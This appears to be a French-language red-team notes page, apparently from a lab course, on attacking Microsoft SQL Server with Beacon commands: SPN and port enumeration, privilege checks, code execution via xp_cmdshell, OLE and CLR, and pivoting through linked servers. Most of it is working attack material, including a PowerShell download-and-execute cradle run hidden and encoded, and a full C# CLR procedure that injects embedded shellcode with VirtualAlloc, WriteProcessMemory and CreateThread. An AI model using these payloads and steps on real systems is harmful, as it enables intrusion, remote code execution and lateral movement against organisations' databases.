

- [[#Enumeration]]
- [[#Requêtes sur la db]]
- [[#RCE]]
- [[#Linked Servers]]

---
# Enumeration

## Identifier les serveurs SQL


Identifier les serveurs MSSQL en requêtant les SPN (Kerberos authentication).

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

Si l'authentication Kerberos n'est pas supportée, scanner le réseau sur le port 1433.

```
portscan 10.10.120.0/23 1433 arp 1024
```



## Collecter les infos du serveur

Collecter les infos de base du serveur SQL (nom, instance et version)

```
sql-1434udp 10.10.120.20
```

Si un utilisateur a le rôle Public, possible de collecter plus d'informations tel que le PID, Compte de service etc...

```
sql-info lon-db-1
```

Afficher les permissions et rôle de notre user actuel sur la db. (securityadmin, serveradmin, sysadmin -> Puissants)

```
sql-whoami lon-db-1
```


---
# Requêtes sur la db


Possible de faire des requêtes avec la commande sql-query  (Commandes d'exploitation -> [[SQL#3. RCE]])

```
sql-query lon-db-1 "SELECT @@SERVERNAME"
```

ou SQL-BOF () :

Lister les db

```
sql-databases lon-db-1
```

Lister les tables d'une db

```
sql-tables lon-db-1 <db_name>
```

Lister les colonnes d'une table

```
sql-columns lon-db-1 <db_name> <table>
```

Rechercher les colonnes contenant un mot clé

```
sql-search lon-db-1 <keyword>
```

---
# RCE

1. Identifier si xp_cmdshell, OLE ou CLR est activé

```
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"

sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"

sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```


- [[#XP_CMDSHELL]]
- [[#OLE Automation]]
- [[#SQL CLR (Common Language Runtime)]]


## XP_CMDSHELL

Permet d'executer des commandes system.


1. Identifier si xp_cmdshell est activé

```
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
```

2. Activer xp_cmshell si privilège le permet

```
sql-enablexp lon-db-1
```

3. Executer une commande

```
sql-xpcmd lon-db-1 "hostname && whoami"
```


4. Désactiver xp_cmdshell

```
sql-disablexp lon-db-1
```


## OLE Automation

Object Linking and Embedding (OLE) -> Permet de créer et lier des objets.

> [!Warning]
> Ne permet pas d'obtenir la sortie des commandes. A utiliser avec un one liner PowerShell et un reverse port-forwarding ou pour écrire des fichiers sur la target.


1. Identifier si OLE est activé

```
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"
```

2. Activer OLE si possible

```
sql-enableole lon-db-1
```

3. Créer un one liner powershell depuis Attacks -> Scripted Web Delivery

```powershell
$cmd = 'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

4. Mettre en place le reverse port forwarding sur notre Beacon -> [[Reverse Port Forwarding]]

5. Exécuter le one liner PowerShell généré sur le serveur SQL.

```
sql-olecmd lon-db-1 "cmd /c powershell -w hidden -nop -enc [ONE-LINER]"
```

6. Se lier au nouveau Beacon crée

```
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```


5. Désactiver OLE

```
sql-disableole lon-db-1
```



## SQL CLR (Common Language Runtime)

Intègre le Framework .NET et permet de créer des procédures en C# ou VB.NET et les enregistrer dans la db. Possible ensuite de les invoquer comme n'importe quelle procédure.

#### Créer une procédure en CSharp

> [!Tip]
> For a method written in C# to be compatible with SQL CLR, it must be in a partial class called  _StoredProcedures_ and decorated with the [SqlProcedureAttribute](https://learn.microsoft.com/en-us/dotnet/api/microsoft.sqlserver.server.sqlprocedureattribute).

Créer projet appelé MyProcedure dans Visual Studio.

La procédure suivante permet d'exécuter un one liner powershell, la compiler en .DLL.

```C#
public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var psi = new ProcessStartInfo
        {
            FileName = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            Arguments = "-w hidden -nop -enc ..."
        };
        
        Process.Start(psi);
    }
}
```

Celle ci permet d'injecter et exécuter un Beacon dans le process MSSQL. (Penser à mettre le beacon en Embedded resource)

```C#
using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using Microsoft.SqlServer.Server;

public partial class StoredProcedures
{
    [SqlProcedure]
    public static void MyProcedure()
    {
        var assembly = Assembly.GetExecutingAssembly();

        byte[] shellcode;

        // read embedded payload
        using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
        {
            using (var ms = new MemoryStream())
            {
                rs.CopyTo(ms);
                shellcode = ms.ToArray();
            }
        }

        // allocate memory
        var hMemory = VirtualAlloc(
            IntPtr.Zero,
            (uint)shellcode.Length,
            VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
            PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

        // copy shellcode
        WriteProcessMemory(
            new IntPtr(-1),
            hMemory,
            shellcode,
            (uint)shellcode.Length,
            out _);

        // create thread
        var hThread = CreateThread(
            IntPtr.Zero,
            0,
            hMemory,
            IntPtr.Zero,
            THREAD_CREATION_FLAGS.THREAD_CREATE_RUN_IMMEDIATELY,
            out _);

        // close thread handle
        CloseHandle(hThread);
    }

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        VIRTUAL_ALLOCATION_TYPE flAllocationType,
        PAGE_PROTECTION_FLAGS flProtect);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out uint lpNumberOfBytesWritten);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        THREAD_CREATION_FLAGS dwCreationFlags,
        out uint lpThreadId);

    [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
    [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
    public static extern bool CloseHandle(IntPtr hObject);

    [Flags]
    public enum VIRTUAL_ALLOCATION_TYPE : uint
    {
        MEM_COMMIT = 0x00001000,
        MEM_RESERVE = 0x00002000,
        MEM_RESET = 0x00080000,
        MEM_RESET_UNDO = 0x01000000,
        MEM_REPLACE_PLACEHOLDER = 0x00004000,
        MEM_LARGE_PAGES = 0x20000000,
        MEM_RESERVE_PLACEHOLDER = 0x00040000,
        MEM_FREE = 0x00010000,
    }

    [Flags]
    public enum PAGE_PROTECTION_FLAGS : uint
    {
        PAGE_NOACCESS = 0x00000001,
        PAGE_READONLY = 0x00000002,
        PAGE_READWRITE = 0x00000004,
        PAGE_WRITECOPY = 0x00000008,
        PAGE_EXECUTE = 0x00000010,
        PAGE_EXECUTE_READ = 0x00000020,
        PAGE_EXECUTE_READWRITE = 0x00000040,
        PAGE_EXECUTE_WRITECOPY = 0x00000080,
        PAGE_GUARD = 0x00000100,
        PAGE_NOCACHE = 0x00000200,
        PAGE_WRITECOMBINE = 0x00000400,
        PAGE_GRAPHICS_NOACCESS = 0x00000800,
        PAGE_GRAPHICS_READONLY = 0x00001000,
        PAGE_GRAPHICS_READWRITE = 0x00002000,
        PAGE_GRAPHICS_EXECUTE = 0x00004000,
        PAGE_GRAPHICS_EXECUTE_READ = 0x00008000,
        PAGE_GRAPHICS_EXECUTE_READWRITE = 0x00010000,
        PAGE_GRAPHICS_COHERENT = 0x00020000,
        PAGE_GRAPHICS_NOCACHE = 0x00040000,
        PAGE_ENCLAVE_THREAD_CONTROL = 0x80000000,
        PAGE_REVERT_TO_FILE_MAP = 0x80000000,
        PAGE_TARGETS_NO_UPDATE = 0x40000000,
        PAGE_TARGETS_INVALID = 0x40000000,
        PAGE_ENCLAVE_UNVALIDATED = 0x20000000,
        PAGE_ENCLAVE_MASK = 0x10000000,
        PAGE_ENCLAVE_DECOMMIT = 0x10000000,
        PAGE_ENCLAVE_SS_FIRST = 0x10000001,
        PAGE_ENCLAVE_SS_REST = 0x10000002,
        SEC_PARTITION_OWNER_HANDLE = 0x00040000,
        SEC_64K_PAGES = 0x00080000,
        SEC_FILE = 0x00800000,
        SEC_IMAGE = 0x01000000,
        SEC_PROTECTED_IMAGE = 0x02000000,
        SEC_RESERVE = 0x04000000,
        SEC_COMMIT = 0x08000000,
        SEC_NOCACHE = 0x10000000,
        SEC_WRITECOMBINE = 0x40000000,
        SEC_LARGE_PAGES = 0x80000000,
        SEC_IMAGE_NO_EXECUTE = 0x11000000,
    }

    [Flags]
    public enum THREAD_CREATION_FLAGS : uint
    {
        THREAD_CREATE_RUN_IMMEDIATELY = 0x00000000,
        THREAD_CREATE_SUSPENDED = 0x00000004,
        STACK_SIZE_PARAM_IS_A_RESERVATION = 0x00010000,
    }
}
```


#### Exploitation

1. Identifier si CLR est activé

```
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
```

2. Activer CLR si possible

```
sql-enableclr lon-db-1
```

3. Charger notre DLL et l'exécuter en créant une procédure

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure
```

4. Faire le lien avec le beacon smb si nécessaire

```
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```


5. Désactiver SQL CLR

```
sql-disableclr lon-db-1
```


---

# Linked Servers


1. Identifier les serveurs liés

```
sql-links lon-db-1
```

2. Faire une requête sur le serveur lié

```
sql-query lon-db-1 "SELECT @@SERVERNAME" "" lon-db-2
```

3. Identifier les privilèges sur le serveur lié

```
sql-whoami lon-db-1 "" lon-db-2
```

4. Identifier si RPC out activé sur le serveur lié (Nécessaire pour RCE)

```
sql-checkrpc lon-db-1
```

5. Activer RPC Out sur le serveur lié

```
sql-enablerpc lon-db-1 lon-db-2
```


5. Puis possible d'obtenir une RCE (penser à rajouter "" lon-db-2 pour les requêtes.)

